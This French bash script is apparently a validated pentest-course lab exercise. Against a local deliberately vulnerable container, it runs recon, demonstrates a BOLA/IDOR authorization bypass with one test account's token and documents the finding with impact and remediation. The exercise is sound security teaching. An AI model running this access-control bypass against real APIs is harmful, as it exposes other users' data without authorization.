#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────
#  Chapitre  : 32 — Cas pratique : test d'intrusion web
#  Exercice  : 2 (Intermédiaire) — Tester et documenter un constat
#  Version   : kali → vuln-api (BOLA/IDOR, Ch27-28)
#  Exécution : bash scripts/09-cas-pratiques/32-kali_constat_idor.sh
#              (depuis lab/ ; nécessite `make up-pentest`)
#  Statut    : VALIDÉ (2026-08-12)
#
#  Adaptation Docker : le manuel cible web-vuln.lab (IP VirtualBox).
#  Le lab utilise vuln-api (nom de conteneur). Cycle complet :
#  recon (curl -sI + nmap -sV) → test AuthZ (BOLA : objet de B
#  avec le jeton de A) → constat VULN-001 documenté (preuve
#  horodatée, impact, remédiation). VULN_MODE=vulnerable par défaut.
# ─────────────────────────────────────────────────────────────
set -euo pipefail
cd "$(dirname "$0")/../.."   # → lab/

echo "== Ch32 Ex2 — Cycle ciblé : recon → test AuthZ → constat =="
fail=0

echo "--- 1. Recon ---"
echo "==> curl -sI http://vuln-api:5000/ (en-têtes)"
docker compose exec -T kali curl -sI http://vuln-api:5000/ | head -8 || true
echo "==> nmap -sV -p 5000 vuln-api"
docker compose exec -T kali nmap -sV -p 5000 vuln-api 2>/dev/null | grep -E "^5000/tcp" || true

echo "--- 2. Test AuthZ (BOLA) : jeton de A → objet de B ---"
# Connexion en tant que A (compte de test)
TOKEN=$(docker compose exec -T kali bash -c \
  'curl -s -X POST http://vuln-api:5000/v1/auth -H "Content-Type: application/json" -d "{\"user\":\"A\",\"password\":\"passA123\"}"' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
echo "jeton A obtenu : ${TOKEN:0:24}…"

# Accès au client 2 (propriétaire B) avec le jeton de A
RESP=$(docker compose exec -T kali bash -c \
  "curl -s -w '\n%{http_code}' http://vuln-api:5000/v1/customers/2 -H 'Authorization: Bearer $TOKEN'")
BODY=$(echo "$RESP" | sed '$d')
CODE=$(echo "$RESP" | tail -n 1)
echo "GET /v1/customers/2 (jeton A) → HTTP $CODE"
echo "$BODY"

echo "--- 3. Constat VULN-001 (fiche) ---"
cat > /tmp/constat-VULN-001-idor.md <<'EOF'
# VULN-001 — Contrôle d'accès défaillant (BOLA / IDOR)

- Cible : vuln-api (Ch27-28), endpoint GET /v1/customers/{id}
- Test : jeton du compte A → accès au client 2 (propriétaire B)
- Preuve : réponse HTTP 200 avec les données du client B (capture + date)
- Impact : accès non autorisé aux données d'autres comptes (API1 OWASP)
- Remédiation : vérifier l'appartenance côté serveur (ch. 27) ;
  en mode fixed, le lab renvoie 403.
- État : À CORRIGER
EOF
cat /tmp/constat-VULN-001-idor.md

echo "--- 4. Preuve horodatée ---"
docker compose exec -T vuln-api date -u +%Y-%m-%dT%H:%M:%SZ > /tmp/preuve-idor-date.txt
cat /tmp/preuve-idor-date.txt

echo
echo "--- Vérifications ---"
[ "$CODE" = "200" ] && echo "✓ BOLA démontré : objet de B accessible avec le jeton de A (HTTP 200)" || { echo "✗ BOLA non démontré (code $CODE) — VULN_MODE doit être vulnerable"; fail=1; }
echo "$BODY" | grep -q "Client B" && echo "✓ preuve : données du client B dans la réponse" || { echo "✗ données de B absentes"; fail=1; }
grep -q "VULN-001" /tmp/constat-VULN-001-idor.md && echo "✓ constat VULN-001 documenté" || { echo "✗ constat absent"; fail=1; }
grep -q "Remédiation" /tmp/constat-VULN-001-idor.md && echo "✓ remédiation documentée" || { echo "✗ remédiation absente"; fail=1; }
grep -q "^[0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}" /tmp/preuve-idor-date.txt && echo "✓ preuve horodatée UTC" || { echo "✗ preuve non horodatée"; fail=1; }

echo
if [ "$fail" -eq 0 ]; then
  echo "✅ Ch32 Ex2 : VALIDÉ"
else
  echo "❌ Ch32 Ex2 : ÉCHEC"
  exit 1
fi
